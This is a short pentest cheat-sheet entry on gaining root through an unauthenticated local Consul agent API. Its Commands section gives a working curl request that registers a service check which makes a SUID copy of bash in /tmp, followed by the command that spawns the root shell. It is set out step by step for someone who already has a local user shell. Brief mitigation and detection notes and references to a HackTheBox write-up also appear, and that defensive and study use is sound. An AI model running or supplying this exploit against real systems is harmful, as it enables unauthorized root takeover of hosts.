---
topic: Consul — service registration with a root check
tags: [linux, consul, service-registration, rce, privesc]
---

# Consul — service registration with a root check

**English** | [🌐 Español](consul-service-registration-rce.md)

## Concept

A Consul agent without ACLs exposes its API on localhost. Anyone who can `PUT /v1/agent/service/register` can define a `Check` with `args`; the agent runs them periodically with its privileges, often root.

## When it applies

- Consul listens on `127.0.0.1:8500` without ACLs.
- The process runs as root.
- You have a local user shell.

## Procedure

1. Confirm the version and services.
2. Create JSON with `Name`, `ID` and `Check.args`.
3. Register the service through the API.
4. Wait for execution and use the SUID binary.

## Commands

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register \
  -H 'Content-Type: application/json' \
  -d '{"Name":"x","ID":"x","Check":{"args":["bash","-c","cp /bin/bash /tmp/root && chmod 6777 /tmp/root"],"interval":"30s"}}'
/tmp/root -p
```

## Variants

- `consul services register` with an HCL file.
- Legacy `script` checks.
- Services with `Exec` or `Docker`.

## Limitations

- Enabled ACLs block writes.
- The agent may run unprivileged.
- The API may be on a Unix socket only.

## Mitigation

- Enable ACLs and least-privilege tokens.
- Run Consul unprivileged.
- Restrict the API to administrators.

## Detection

- New service registrations.
- Checks with `bash` or network commands.
- Child processes of the Consul agent.

## References

- [0xdf — Heal](https://0xdf.gitlab.io/2025/05/17/htb-heal.html)
- [HashiCorp — Consul HTTP API](https://developer.hashicorp.com/consul/api-docs/agent/service)
- [HashiCorp — Consul ACLs](https://developer.hashicorp.com/consul/docs/security/acl)
